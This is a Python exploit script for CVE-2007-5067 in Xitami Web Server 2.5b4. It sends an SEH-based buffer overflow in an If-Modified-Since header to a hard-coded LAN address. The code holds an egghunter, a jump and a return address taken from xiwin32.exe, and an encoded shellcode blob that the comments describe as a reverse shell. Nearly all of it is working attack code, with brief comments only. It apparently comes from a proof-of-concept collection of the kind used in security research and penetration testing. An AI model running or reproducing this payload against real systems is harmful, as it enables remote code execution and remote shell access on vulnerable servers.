#!/usr/bin/python

# CVE: CVE-2007-5067 (https://www.cvedetails.com/cve/CVE-2007-5067/)
# Method: SEH with custom shellcode for a reverse shell
# Author: werebug (https://werebug.com)
# Tested on: Windows 7
# Software: Xitami Web Server 2.5b4

import requests

target = "http://192.168.1.126"

# nseh offset at 188
payload = "A" * 108
# Egghunter 32 bytes - Egg: 57657265
payload += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x65\x72\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
payload += "B" * (188 - len(payload))
#nasm > jmp short -0x50
#00000000  EBAE              jmp short 0xffffffb0
payload += "\xEB\xAE\x41\x41"
# 0x00406e64 : pop ebp # pop ecx # ret  | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [xiwin32.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Xitami\xiwin32.exe)
payload += "\x64\x6e\x40"

headers = {
    'If-Modified-Since': 'Wed, ' + payload
}
data = "WereWere"
data += "\x90" * 16
data += ("\xb8\xfd\x41\xfd\xe1\xda\xcd\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x42\x12\x03\x42\x12\x83\x17\xbd\x1f\x14\x1b\xd6\x62"
"\xd7\xe3\x27\x03\x51\x06\x16\x03\x05\x43\x09\xb3\x4d\x01\xa6"
"\x38\x03\xb1\x3d\x4c\x8c\xb6\xf6\xfb\xea\xf9\x07\x57\xce\x98"
"\x8b\xaa\x03\x7a\xb5\x64\x56\x7b\xf2\x99\x9b\x29\xab\xd6\x0e"
"\xdd\xd8\xa3\x92\x56\x92\x22\x93\x8b\x63\x44\xb2\x1a\xff\x1f"
"\x14\x9d\x2c\x14\x1d\x85\x31\x11\xd7\x3e\x81\xed\xe6\x96\xdb"
"\x0e\x44\xd7\xd3\xfc\x94\x10\xd3\x1e\xe3\x68\x27\xa2\xf4\xaf"
"\x55\x78\x70\x2b\xfd\x0b\x22\x97\xff\xd8\xb5\x5c\xf3\x95\xb2"
"\x3a\x10\x2b\x16\x31\x2c\xa0\x99\x95\xa4\xf2\xbd\x31\xec\xa1"
"\xdc\x60\x48\x07\xe0\x72\x33\xf8\x44\xf9\xde\xed\xf4\xa0\xb6"
"\xc2\x34\x5a\x47\x4d\x4e\x29\x75\xd2\xe4\xa5\x35\x9b\x22\x32"
"\x39\xb6\x93\xac\xc4\x39\xe4\xe5\x02\x6d\xb4\x9d\xa3\x0e\x5f"
"\x5d\x4b\xdb\xf0\x0d\xe3\xb4\xb0\xfd\x43\x65\x59\x17\x4c\x5a"
"\x79\x18\x86\xf3\x10\xe3\x41\x3c\x4c\xea\xe9\xd4\x8f\xec\x18"
"\xf2\x19\x0a\x70\xec\x4f\x85\xed\x95\xd5\x5d\x8f\x5a\xc0\x18"
"\x8f\xd1\xe7\xdd\x5e\x12\x8d\xcd\x37\xd2\xd8\xaf\x9e\xed\xf6"
"\xc7\x7d\x7f\x9d\x17\x0b\x9c\x0a\x40\x5c\x52\x43\x04\x70\xcd"
"\xfd\x3a\x89\x8b\xc6\xfe\x56\x68\xc8\xff\x1b\xd4\xee\xef\xe5"
"\xd5\xaa\x5b\xba\x83\x64\x35\x7c\x7a\xc7\xef\xd6\xd1\x81\x67"
"\xae\x19\x12\xf1\xaf\x77\xe4\x1d\x01\x2e\xb1\x22\xae\xa6\x35"
"\x5b\xd2\x56\xb9\xb6\x56\x76\x58\x12\xa3\x1f\xc5\xf7\x0e\x42"
"\xf6\x22\x4c\x7b\x75\xc6\x2d\x78\x65\xa3\x28\xc4\x21\x58\x41"
"\x55\xc4\x5e\xf6\x56\xcd")

requests.get(target, headers=headers, data=data)
